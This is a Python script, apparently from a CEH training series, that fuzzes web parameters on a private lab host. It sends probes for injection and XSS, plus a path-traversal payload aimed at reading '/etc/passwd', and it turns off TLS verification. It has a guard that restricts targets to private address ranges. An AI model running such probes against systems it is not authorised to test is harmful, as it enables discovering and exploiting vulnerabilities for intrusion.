#!/usr/bin/env python3
# LAB-ONLY: Advanced Web Fuzzer (Parameter Discovery + Fuzzing)
# CEH v13 Ultimate Offensive Script 05
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
import requests
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_TARGET_URL = "http://192.168.100.10/"
LAB_PARAM_WORDLIST = ["id", "user", "file", "page", "url", "path", "name", "email", "pass", "cmd"]
LAB_FUZZ_PAYLOADS = ["'", "\"", "<script>", "admin", "../../etc/passwd"]
LAB_THREADS = 10
# -----------------------------------------------------------------------------------

def test_param(url, param, payload):
    try:
        full_url = f"{url}?{param}={requests.utils.quote(payload)}"
        response = requests.get(full_url, timeout=3, verify=False)
        if response.status_code in [200, 403, 500]:
            return (param, payload, response.status_code, response.text[:100])
        return None
    except:
        return None

def main():
    print("="*80)
    print("LAB-ONLY: Advanced Web Fuzzer")
    print("="*80)
    print(f"[*] Target: {LAB_TARGET_URL}")
    print("-"*80)
    found = []
    with ThreadPoolExecutor(max_workers=LAB_THREADS) as executor:
        futures = []
        for param in LAB_PARAM_WORDLIST:
            for payload in LAB_FUZZ_PAYLOADS:
                futures.append(executor.submit(test_param, LAB_TARGET_URL, param, payload))
        for future in as_completed(futures):
            res = future.result()
            if res:
                found.append(res)
                print(f"[+] Found: param={res[0]}, payload={res[1]}, status={res[2]}")
    print("-"*80)
    print(f"[+] Total interesting findings: {len(found)}")

if __name__ == "__main__":
    if not any(prefix in LAB_TARGET_URL for prefix in ["10.", "172.16.", "172.17.", "172.18.", "172.19.", "172.20.", "172.21.", "172.22.", "172.23.", "172.24.", "172.25.", "172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31.", "192.168.", "localhost", "127.0.0.1"]):
        print("ERROR: LAB-ONLY! Private targets only!")
        sys.exit(1)
    import urllib3
    urllib3.disable_warnings()
    main()
